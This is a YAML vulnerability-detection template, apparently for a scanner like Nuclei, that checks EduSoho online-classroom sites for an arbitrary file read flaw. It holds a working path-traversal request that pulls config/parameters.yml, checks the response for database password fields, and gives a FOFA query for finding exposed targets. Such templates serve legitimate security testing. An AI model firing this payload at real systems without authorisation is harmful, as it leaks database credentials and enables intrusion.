# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - 'parameters:'
          - 'database_driver:'
          - 'database_host:'
          - 'database_port:'
          - 'database_name:'
          - 'database_password:'
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/export/classroom-course-statistics?fileNames[]=../../../config/parameters.yml'
id: edusohu-classroom-course-statistics-fileread
info:
  author: zan8in
  description: |-
    Edusoho网络课堂是面向个人、学校、培训机构及企业用户的友好、开源、高性价比的在线教育建站系统。Edusoho网络课堂存在任意文件读取漏洞
    fofa: title="EduSoho"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: Edusoho网络课堂cms存在任意文件读取
  severity: high
  tags: edusoho,fileread,argus-import
